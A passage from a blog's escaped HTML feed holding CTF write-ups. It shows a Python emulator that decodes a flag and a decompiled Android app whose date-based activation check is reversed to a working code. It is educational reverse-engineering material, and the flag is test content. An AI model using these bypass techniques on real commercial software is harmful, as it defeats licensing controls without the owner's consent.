style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;]

i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
bval &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ret:
	opcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]
	op1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]
	op2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]

	&lt;span style=&#34;color:#75715e&#34;&gt;# print(&amp;#34;{}, {}, {}&amp;#34;.format(opcode, op1, op2))&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
		data[op1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; op2
	&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
		bval &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[op1]
	&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
		data[op1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[op1] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; bval
	&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
		ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

	i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first few numbers look like ASCII, converting them,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;]
data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [chr(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; data]
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(data))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We get the flag - &lt;code&gt;FLAG{VMS-ARE-FOR-MALWARE}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>hxp 36C3 CTF Writeups</title>
      <link>https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/</link>
      <pubDate>Sun, 29 Dec 2019 14:06:46 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/</guid>
      <description>&lt;p&gt;The hxp CTF happens every year along with the Chaos Communication Congress (a top security conference). This year was the 36th edition. This CTF is a major CTF, you know this when the CTF has a rating weight of 63.0 on CTFTime. Also, it is one of the qualifier events of &lt;a href=&#34;https://www.oooverflow.io/dc-ctf-2020-quals/&#34;&gt;DEFCON 2020 CTF&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I was playing solo on this one and gave one day to this CTF. I managed to solve 2 problems in the main CTF and 2 in the &lt;a href=&#34;https://kuchenblech.xyz/&#34;&gt;Junior CTF&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here are the writeups for the challenges I solved.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;main-ctf&#34;&gt;Main CTF&lt;/h1&gt;
&lt;h2 id=&#34;1337-skills---android-rev&#34;&gt;1337 Skills - Android, Rev&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;App: &lt;a href=&#34;https://play.google.com/store/apps/details?id=com.progressio.wildskills&#34;&gt;Link&lt;/a&gt;&lt;br&gt;
Connection: nc 88.198.154.132 7002&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;First, I installed the app on my phone, to try to play around with it a bit. But the very first page was a login type screen asking for a code. I knew I had to open it in a decompiler to see what is happening and figure out the code. I extracted the APK of the app and opened it up in jadx.&lt;/p&gt;
&lt;p&gt;First I took a look at the AndroidManifest.xml, to find the launcher activity.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/manifest.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/manifest.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The class we have to check out first is the &lt;code&gt;com.progressio.wildskills.MainActivity&lt;/code&gt;. Opening this we see that the &lt;code&gt;onCreate&lt;/code&gt; method calls the &lt;code&gt;activateApp&lt;/code&gt; method to check the activation code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;activateApp&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Integer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;parseInt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;NumberFormatException unused&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    Calendar instance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Calendar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Math&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)),&lt;/span&gt; 2&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 999983&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        findViewById&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;scrollViewActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setVisibility&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;InputMethodManager&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; getSystemService&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input_method&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;hideSoftInputFromWindow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getWindowToken&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        SharedPreferences&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Editor&lt;/span&gt; edit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;prefsmain&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;putBoolean&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Activated&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getTime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;putLong&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Installed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;putLong&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ActivationDate&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;commit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    Toast&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ungültiger Aktivierungscode&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;requestFocus&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;InputMethodManager&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; getSystemService&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input_method&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;showSoftInput&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have to pay attenton to&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Math&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)),&lt;/span&gt; 2&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 999983&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For 29th December 2019, this value is a constant and equal to &lt;code&gt;76429&lt;/code&gt;. Entering this, we get access to the app. Next on the top right corner of the app, there are options namely Sales, Leadership, Smart Profuction (the current page) and Service Roadmap. Each of these (except Smart Production) require their own activation codes. We deg deeper into the app&amp;rsquo;s code for this.&lt;/p&gt;
&lt;p&gt;One thing I note is that on entering a wrong code, the following message is shown as a Toast - &amp;ldquo;Ungültiger Aktivierungscode&amp;rdquo;. So, I used Jadx&amp;rsquo;s Text Search to find all instances of this. We find this&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/codes.png&#34; &gt;
